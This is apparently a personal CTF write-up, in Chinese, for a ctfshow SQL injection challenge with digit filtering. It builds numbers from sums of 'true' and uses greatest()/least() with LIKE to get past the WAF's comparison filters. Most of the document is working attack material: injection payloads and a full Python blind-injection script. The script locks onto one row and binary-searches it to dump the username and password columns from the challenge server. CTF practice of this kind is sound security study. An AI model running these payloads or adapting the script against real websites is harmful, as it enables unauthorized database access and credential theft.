#true累加 #greatest #least
![[Pasted image 20260412171138.png]]
是[[ctfshow185sql数字过滤]]的升级版
测试一下可用的输入窗口：
```
import requests

data = {
    "tableName": "ctfshow_user a right join ctfshow_user b on least(true,true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true) like true"
}

url = "http://1de21f7c-d92d-4154-b156-1224399ab141.challenge.ctf.show/select-waf.php"
response = requests.post(url, data=data)

if "$user_count = 0;" in response.text:
    print("failed")
else:
    print(response.text)

```
发现输入窗口特别大，能用true累加来表示很大的数字。所以[[ctfshow185sql数字过滤]]中给出的另一个不用位运算的方法能直接解决这道题。

**不过找到题很有价值的一点就是它摧毁了基础的二分法盲注使用条件，在本题目中我发现可以用以下内容替代大小比较**
```
  -- GREATEST(a,b) 返回较大值，配合 LIKE 做大小判断
GREATEST(ASCII(SUBSTR(database(),true(),true())),0x6d)/**/LIKE/**/0x6d
-- 含义：ASCII值 >= 0x6d('m') 时，GREATEST返回的就是ASCII值本身，LIKE 0x6d 为假
-- ASCII值 < 0x6d 时，GREATEST返回0x6d，LIKE 0x6d 为真
-- 反过来就能做二分

-- 或者用 LEAST()
LEAST(ASCII(SUBSTR(database(),true(),true())),0x6d)/**/LIKE/**/0x6d
-- 含义：ASCII值 <= 0x6d 时为真，> 0x6d 时为假
```
经过payload `tableName=ctfshow_user a right join ctfshow_user b on greatest(true,true%2Btrue) like true%2Btrue` 探测发现 **greatest()和least()** 的确很好用，但是由于本题目过滤了数字，所以没法用十六进制，必须要用true之间的计算。

另外为了更优雅地解决本题，**我发现pow()可以替代位运算符号来实现指数运算** ，那么有了这个指数运算方法，我们就可以用数学的方式来形成 **少量输入替代大量输入** 的攻势了！

另外还有一点值得注意就是，`requests库` 会对 `post` 自动进行百分号编码，所以要避免payload中包含百分号编码而导致二次编码。在[[ctfshow185sql数字过滤]]中曾记录过这一点。

---

## 重点
本题还引入了新的一层难度，pass不再是单行就能匹配到flag，而是改成了多行当中盲注flag。针对此问题我们需要想方法匹配到flag所在的那一行，可以对pass字段进行盲注，来匹配前缀，然后筛选出合适的id。
控制id: `ctfshow_user a right join ctfshow_user b on b.id like true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true`
控制id的同时盲注flag: 
```
ctfshow_user a right join ctfshow_user b on least(b.id like
  true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true,least(ascii(substr(b.pass,true,true)),true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true
  +true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+t
  rue+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true) like
  true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+tr
  ue+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true)
```
整个逻辑等价于
```
-- 实际混淆写法的逻辑拆解

ctfshow_user a RIGHT JOIN ctfshow_user b ON
  least(
    b.id LIKE 27,          -- 条件1：b.id 匹配某个值（26个true=26，这里是26）
    least(
      ascii(substr(b.pass, 1, 1)),   -- 取 pass 第一个字符的 ASCII 值
      99                             -- 与 99 比较（99个true=99）
    ) LIKE 99              -- 条件2：ascii值 >= 99 时 least() 返回99，LIKE成立
  )
```

---

最终可行脚本：
```
  import re
  import time
  import requests
  from requests.adapters import HTTPAdapter
  from urllib3.util.retry import Retry

  URL = "http://1de21f7c-d92d-4154-b156-1224399ab141.challenge.ctf.show/select-waf.php"
  TARGET_ID = 26  # 已定位的 flag 行 id

  s = requests.Session()
  retry = Retry(
      total=5,
      connect=5,
      read=5,
      backoff_factor=0.2,
      status_forcelist=[429, 500, 502, 503, 504],
      allowed_methods=["GET", "POST"],
  )
  s.mount("http://", HTTPAdapter(max_retries=retry))
  s.mount("https://", HTTPAdapter(max_retries=retry))


  def n(x: int) -> str:
      return "false" if x == 0 else "+".join(["true"] * x)


  def count(cond: str) -> int:
      payload = f"ctfshow_user a right join ctfshow_user b on {cond}"
      for _ in range(6):
          try:
              r = s.post(URL, data={"tableName": payload}, timeout=12)
              m = re.search(r"user_count\s*=\s*(\d+)\s*;", r.text, re.I)
              if m:
                  return int(m.group(1))
          except Exception:
              time.sleep(0.2)
      raise RuntimeError("request failed repeatedly")


  # 基线：false 和“某 id 存在”时的计数
  BASE_FALSE = count("false")                         # 22
  ROW_TRUE = count(f"b.id like {n(TARGET_ID)}")      # 43


  def row_oracle(expr: str) -> bool:
      # 把“锁定某一行”与“字符判断”合并
      cond = f"least(b.id like {n(TARGET_ID)},{expr})"
      return count(cond) == ROW_TRUE


  def get_len(col: str, max_try: int = 128) -> int:
      hi = 1
      while hi <= max_try and row_oracle(f"least(length(b.{col}),{n(hi)}) like {n(hi)}"):
          hi *= 2

      lo = hi // 2
      hi = min(hi - 1, max_try)
      while lo < hi:
          mid = (lo + hi + 1) // 2
          ok = row_oracle(f"least(length(b.{col}),{n(mid)}) like {n(mid)}")
          if ok:
              lo = mid
          else:
              hi = mid - 1
      return lo


  def get_char(col: str, pos: int) -> str:
      lo, hi = 32, 126
      p = n(pos)
      while lo < hi:
          mid = (lo + hi + 1) // 2
          m = n(mid)
          expr = f"least(ascii(substr(b.{col},{p},true)),{m}) like {m}"
          if row_oracle(expr):
              lo = mid
          else:
              hi = mid - 1
      return chr(lo)


  def dump_col(col: str) -> str:
      L = get_len(col)
      out = ""
      for i in range(1, L + 1):
          out += get_char(col, i)
          print(f"{col}[{i}] => {out}")
      return out


  if __name__ == "__main__":
      username = dump_col("username")
      password = dump_col("pass")
      print("USERNAME:", username)
      print("PASS:", password)
```